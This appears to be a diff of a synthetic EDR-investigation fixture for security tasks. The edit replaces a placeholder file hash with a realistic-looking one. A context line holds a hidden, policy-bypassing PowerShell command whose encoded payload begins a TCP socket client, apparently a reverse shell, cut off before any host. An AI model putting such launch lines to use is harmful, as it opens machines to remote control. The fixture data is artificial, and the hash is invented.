@@ -1034,7 +1034,7 @@ Based on your analysis:
           pid: 4892,
           parent_name: "cmd.exe",
           cmdline: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAUAB...",
-          hash: { sha256: "a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef0123456789ab" }
+          hash: { sha256: "505e6a45917684bf24f4603e189a29713c196e734821c6df2b104e7147d53ff0" }
         },
         // Field names follow the same Falcon schema as malware-analysis (batch-07)
         // and edr-detection-investigation (batch-28): event_simpleName,
